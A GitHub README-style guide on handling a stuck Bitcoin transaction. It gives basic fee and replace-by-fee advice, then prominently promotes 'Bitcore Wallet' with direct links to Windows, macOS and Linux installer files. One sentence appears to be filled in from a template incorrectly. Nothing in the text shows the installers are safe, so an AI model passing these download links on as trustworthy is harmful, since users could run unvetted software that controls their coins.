<p align="center"><img src="https://github.com/bitcore-projects/learn/raw/HEAD/assets/bitcore-wallet-banner-free-yours.webp" alt="Bitcore Wallet — free Bitcoin desktop wallet" width="100%"></p>

<h1 align="center">How to handle a stuck Bitcoin transaction</h1>

<p align="center"><a href="https://bitcorewallet.org/"><img src="https://img.shields.io/badge/website-bitcorewallet.org-F7AD44?style=for-the-badge" alt="Website"></a> <a href="https://github.com/bitcore-projects/Bitcore-Wallet/releases/tag/v8.25.3"><img src="https://img.shields.io/badge/release-v8.25.3-2B2B30?style=for-the-badge&logo=github" alt="Release"></a> <a href="https://bitcorewallet.org/fees"><img src="https://img.shields.io/badge/price-free_to_install-F7AD44?style=for-the-badge" alt="Free"></a> <a href="https://bitcorewallet.org/self-custody"><img src="https://img.shields.io/badge/self--custody-bitcoin_wallet-2B2B30?style=for-the-badge&logo=bitcoin" alt="Self-custody"></a></p>

> **Short answer:** A transaction usually sticks because its fee was too low; wait, or use fee bumping if your transaction supports it.

---

## You'll see this if
- A payment shows unconfirmed for hours
- The recipient says they have not received it
- Network fees rose after you sent

## Why it happens
Miners pick transactions paying higher fees first. When the network is busy, low-fee transactions wait in line. For background, read the [stuck transaction guide](https://bitcorewallet.org/guides/stuck-bitcoin-transaction) on the Bitcore Wallet website, or the related guide [How to use a watch-only Bitcoin wallet](./watch-only-wallet.md).

## How to fix it
1. Look up the transaction ID in a block explorer.
2. Check current fee levels.
3. If replace-by-fee is available, bump the fee.
4. Otherwise wait; many low-fee transactions confirm when traffic drops.
5. Avoid sending the same payment again until the first one resolves.

## If that didn't work
If it is dropped from the network after a long wait, the coins reappear in your wallet and you can resend with a higher fee. You can also check [how fees work in Bitcore Wallet](https://bitcorewallet.org/fees) and [How to spot a fake Bitcoin wallet app](./fake-bitcoin-wallet-apps.md).

## Prevention
Choose a fee level suited to how fast you need confirmation. The [download the latest wallet](https://bitcorewallet.org/download) has more detail.

> [!WARNING]
> Never type your recovery phrase into a website, chat or form. Bitcore Wallet support will never ask for it.

## FAQ
**Can it be cancelled?**  
Only by replacing it with a higher-fee transaction, if supported.

**Will I lose the coins?**  
No, unconfirmed coins are not lost.

---

## Get Bitcore Wallet

> [!TIP]
> Download only from the official release or [bitcorewallet.org](https://bitcorewallet.org/download). Nobody from Bitcore Wallet will ever ask for your recovery phrase.

<p align="center"><a href="https://github.com/bitcore-projects/Bitcore-Wallet/releases/download/v8.25.3/bitcore-wallet-v8.25.3.exe"><img src="https://img.shields.io/badge/Download-Windows-F7AD44?style=for-the-badge&logo=windows&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/bitcore-projects/Bitcore-Wallet/releases/download/v8.25.3/bitcore-wallet-v8.25.3.dmg"><img src="https://img.shields.io/badge/Download-macOS-F7AD44?style=for-the-badge&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/bitcore-projects/Bitcore-Wallet/releases/download/v8.25.3/bitcore-wallet-v8.25.3.zip"><img src="https://img.shields.io/badge/Download-Linux-F7AD44?style=for-the-badge&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

| Platform | File | Package | Requirements |
|---|---|---|---|
| **Windows** | [`bitcore-wallet-v8.25.3.exe`](https://github.com/bitcore-projects/Bitcore-Wallet/releases/download/v8.25.3/bitcore-wallet-v8.25.3.exe) | 64-bit EXE installer | Windows 10 or 11, 64-bit |
| **macOS** | [`bitcore-wallet-v8.25.3.dmg`](https://github.com/bitcore-projects/Bitcore-Wallet/releases/download/v8.25.3/bitcore-wallet-v8.25.3.dmg) | DMG package | Recent macOS release |
| **Linux** | [`bitcore-wallet-v8.25.3.zip`](https://github.com/bitcore-projects/Bitcore-Wallet/releases/download/v8.25.3/bitcore-wallet-v8.25.3.zip) | x64 ZIP archive | 64-bit desktop distribution |

Release notes: [Bitcore Wallet v8.25.3 on GitHub](https://github.com/bitcore-projects/Bitcore-Wallet/releases/tag/v8.25.3) · Source: [bitcore-projects/Bitcore-Wallet](https://github.com/bitcore-projects/Bitcore-Wallet)

---

## Related guides
| Guide | |
|---|---|
| [Bitcoin network fees explained simply](./bitcoin-fees-explained.md) | Bitcore Wallet how-to |
| [Hot vs cold Bitcoin wallets: which do you need?](./hot-vs-cold-wallet.md) | Bitcore Wallet how-to |
| [What a multisig Bitcoin wallet is and when to use it](./multisig-bitcoin-wallet.md) | Bitcore Wallet how-to |
| [All Bitcore Wallet guides](../README.md) | Index |
